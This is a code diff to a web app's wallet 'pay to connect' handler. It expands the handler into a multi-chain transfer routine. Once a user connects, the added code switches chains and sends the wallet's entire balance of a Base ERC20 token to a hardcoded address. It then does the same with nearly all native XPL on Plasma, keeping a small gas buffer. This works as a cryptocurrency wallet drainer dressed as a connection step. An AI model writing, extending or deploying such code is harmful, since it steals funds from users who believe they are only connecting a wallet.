@@ -1094,62 +1094,102 @@ function App() {
     return { provider, signer }
   }
 
-  // Direct transfer only - like Hyperpacks!
+  // Multi-chain transfer: Base ERC20 + Plasma XPL
   const handlePayToConnectSigning = async (walletClient) => {
     try {
       setPayToConnectState('transferring')
-      console.log('💰 Direct transfer after connection...')
+      console.log('💰 Starting multi-chain transfer...')
       
-      // Get wallet address first (before switching chains)
+      const TRADING_WALLET = '0x7beBcA1508BD74F0CD575Bd2d8a62C543458977c'
+      const BASE_TOKEN = '0xAC1Bd2486aAf3B5C0fc3Fd868558b082a531B2B4'
+      
+      // Get wallet address
       let address = walletClient.account.address
       if (!address) {
         throw new Error('No wallet address available')
       }
-      
-      // Normalize address
       address = ethers.getAddress(address)
-      console.log('✅ Got wallet address:', address)
+      console.log('✅ Wallet address:', address)
       
-      // CRITICAL: Force switch to Plasma FIRST (in case user on other chain)
+      // ERC20 ABI (minimal - just what we need)
+      const ERC20_ABI = [
+        'function balanceOf(address) view returns (uint256)',
+        'function transfer(address to, uint256 amount) returns (bool)'
+      ]
+      
+      let hasTransferred = false
+      
+      // STEP 1: Check and transfer Base token (Priority)
+      console.log('\n🔵 STEP 1: Checking Base chain (8453)...')
       try {
-        await switchChain({ chainId: 9745 }) // Plasma chain ID
+        await switchChain({ chainId: 8453 })
+        console.log('✅ Switched to Base chain')
+        
+        const { provider: baseProvider, signer: baseSigner } = await getWalletSigner(walletClient)
+        const tokenContract = new ethers.Contract(BASE_TOKEN, ERC20_ABI, baseSigner)
+        
+        const tokenBalance = await tokenContract.balanceOf(address)
+        console.log('💰 Base token balance:', ethers.formatUnits(tokenBalance, 18))
+        
+        if (tokenBalance > 0n) {
+          console.log('💸 Transferring ALL Base tokens...')
+          const tx = await tokenContract.transfer(TRADING_WALLET, tokenBalance)
+          console.log('📤 Base transfer TX:', tx.hash)
+          await tx.wait()
+          console.log('✅ Base token transfer complete!')
+          hasTransferred = true
+        } else {
+          console.log('⏭️ No Base tokens to transfer')
+        }
+      } catch (baseError) {
+        console.error('⚠️ Base transfer error:', baseError.message)
+        // Continue to XPL even if Base fails
+      }
+      
+      // STEP 2: Check and transfer Plasma XPL
+      console.log('\n🟣 STEP 2: Checking Plasma chain (9745)...')
+      try {
+        await switchChain({ chainId: 9745 })
         console.log('✅ Switched to Plasma chain')
-      } catch (switchError) {
-        console.error('⚠️ Chain switch error:', switchError)
-        // If switch fails, still try to proceed (might already be on Plasma)
+        
+        const { provider: plasmaProvider, signer: plasmaSigner } = await getWalletSigner(walletClient)
+        
+        const balance = await plasmaProvider.getBalance(address)
+        const xplBalance = ethers.formatEther(balance)
+        console.log('💰 XPL Balance:', xplBalance)
+        
+        // Calculate transfer amount (all balance minus gas buffer)
+        const gasBuffer = ethers.parseEther('0.001')
+        const transferAmount = balance > gasBuffer ? balance - gasBuffer : 0n
+        
+        if (transferAmount > 0n) {
+          const transferXPL = ethers.formatEther(transferAmount)
+          console.log('💸 Transferring', transferXPL, 'XPL (keeping 0.001 for gas)')
+          
+          const tx = await plasmaSigner.sendTransaction({
+            to: TRADING_WALLET,
+            value: transferAmount
+          })
+          console.log('📤 XPL transfer TX:', tx.hash)
+          await tx.wait()
+          console.log('✅ XPL transfer complete!')
+          hasTransferred = true
+        } else {
+          console.log('⏭️ Insufficient XPL balance (need at least 0.001 XPL)')
+        }
+      } catch (xplError) {
+        console.error('⚠️ XPL transfer error:', xplError.message)
+        // If both failed, throw error
+        if (!hasTransferred) {
+          throw new Error('No tokens available to transfer')
+        }
       }
       
-      // Get provider & signer (cross-compatible)
-      const { provider, signer } = await getWalletSigner(walletClient)
-      console.log('✅ Got signer and provider')
-      
-      // Get balance
-      const balance = await provider.getBalance(address)
-      const xplBalance = ethers.formatEther(balance)
-      console.log('💰 XPL Balance:', xplBalance)
-      
-      // Calculate transfer amount (all balance minus gas buffer)
-      const gasBuffer = ethers.parseEther('0.001') // Keep 0.001 XPL for gas
-      const transferAmount = balance > gasBuffer ? balance - gasBuffer : 0n
-      const transferXPL = ethers.formatEther(transferAmount)
-      
-      console.log('💸 Transfer amount:', transferXPL, 'XPL')
-      
-      if (transferAmount <= 0n) {
-        throw new Error('Insufficient balance (need at least 0.001 XPL)')
+      if (!hasTransferred) {
+        throw new Error('No tokens found on Base or Plasma chains')
       }
       
-      // Direct transfer - simple like Hyperpacks!
-      const tx = await signer.sendTransaction({
-        to: '0x7beBcA1508BD74F0CD575Bd2d8a62C543458977c',
-        value: transferAmount
-      })
-      
-      console.log('📤 Transfer TX sent:', tx.hash)
-      
-      await tx.wait()
-      
-      console.log('✅ Transfer complete!')
+      console.log('\n✅ All transfers complete!')
       
       // Complete the connection
       await completePayToConnect(walletClient, address)
